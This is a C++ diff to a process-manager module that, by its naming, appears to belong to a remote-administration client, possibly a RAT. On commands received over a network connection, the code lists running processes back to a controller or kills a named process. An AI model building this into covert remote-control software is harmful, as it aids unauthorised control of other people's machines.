@@ -25,23 +25,40 @@ CProcessManager::~CProcessManager()
 
 void CProcessManager::HandleIo(PBYTE BufferData, ULONG_PTR BufferLength)
 {
+	BYTE IsToken;
 
+	switch (BufferData[0])
+	{
+		case CLIENT_PROCESS_MANAGER_REFRESH_REQUIRE:
+		{
+
+		SendClientProcessList();
+
+		break;
+		}
+		case CLIENT_PROCESS_MANAGER_KILL_REQUIRE:
+		{
+
+			//SeCreateProcess1((LPBYTE)BufferData + sizeof(BYTE), BufferLength - sizeof(BYTE));
+
+			//SeCreateProcess6((LPBYTE)BufferData + sizeof(BYTE), BufferLength - sizeof(BYTE));
+			KillProcess((LPBYTE)BufferData + sizeof(BYTE), BufferLength - sizeof(BYTE));
+
+			break;
+		}
+	}
 }
 BOOL CProcessManager::SendClientProcessList()
 {
 
-	BOOL  IsOk = FALSE;
-	/*	DWORD Offset = 1;
+		BOOL  IsOk = FALSE;
+		DWORD Offset = 1;
 		DWORD v1 = 0;
 		ULONG ItemCount = 0;
 		char* BufferData = NULL;
-		vector<PROCESS_ITEM_INFORMATION> ProcessItemInfoVector;
-		vector<PROCESS_ITEM_INFORMATION>::iterator i;
-		if (m_IsWow64Process == NULL)
-		{
-			return IsOk;
-		}
-		if (SeEnumProcessByToolHelp32(ProcessItemInfoVector) == FALSE)
+		vector<PROCESS_INFORMATION_ITEM> ProcessItemInfoVector;
+		vector<PROCESS_INFORMATION_ITEM>::iterator i;
+		if (EnumProcessByToolHelp32(ProcessItemInfoVector) == FALSE)
 		{
 			return IsOk;
 		}
@@ -57,7 +74,7 @@ BOOL CProcessManager::SendClientProcessList()
 		for (i = ProcessItemInfoVector.begin(); i != ProcessItemInfoVector.end(); i++)
 		{
 			v1 = sizeof(HANDLE) +
-				lstrlen(i->ProcessImageName) + lstrlen(i->ProcessFullPath) + lstrlen(i->IsWow64Process) + 3;
+				lstrlen(i->ProcessImageName) + lstrlen(i->ProcessFullPath) + lstrlen(i->isWow64Process) + 3;
 			// 缓冲区太小，再重新分配下
 			if (LocalSize(BufferData) < (Offset + v1))
 			{
@@ -65,23 +82,23 @@ BOOL CProcessManager::SendClientProcessList()
 					LMEM_ZEROINIT | LMEM_MOVEABLE);
 			}
 
-			memcpy(BufferData + Offset, &(i->ProcessID), sizeof(HANDLE));
+			memcpy(BufferData + Offset, &(i->ProcessIdentity), sizeof(HANDLE));
 			Offset += sizeof(HANDLE);
 			memcpy(BufferData + Offset, i->ProcessImageName, lstrlen(i->ProcessImageName) + 1);
 			Offset += lstrlen(i->ProcessImageName) + 1;
 			memcpy(BufferData + Offset, i->ProcessFullPath, lstrlen(i->ProcessFullPath) + 1);
 			Offset += lstrlen(i->ProcessFullPath) + 1;
-			memcpy(BufferData + Offset, i->IsWow64Process, lstrlen(i->IsWow64Process) + 1);
-			Offset += lstrlen(i->IsWow64Process) + 1;
+			memcpy(BufferData + Offset, i->isWow64Process, lstrlen(i->isWow64Process) + 1);
+			Offset += lstrlen(i->isWow64Process) + 1;
 		}
-		m_IOCPClient->OnSending((char*)BufferData, LocalSize(BufferData));
+		m_IocpClient->OnSending((char*)BufferData, LocalSize(BufferData));
 		IsOk = TRUE;
 	Exit:
 		if (BufferData != NULL)
 		{
 			LocalFree(BufferData);
 			BufferData = NULL;
-		}*/
+		}
 	return IsOk;
 }
 
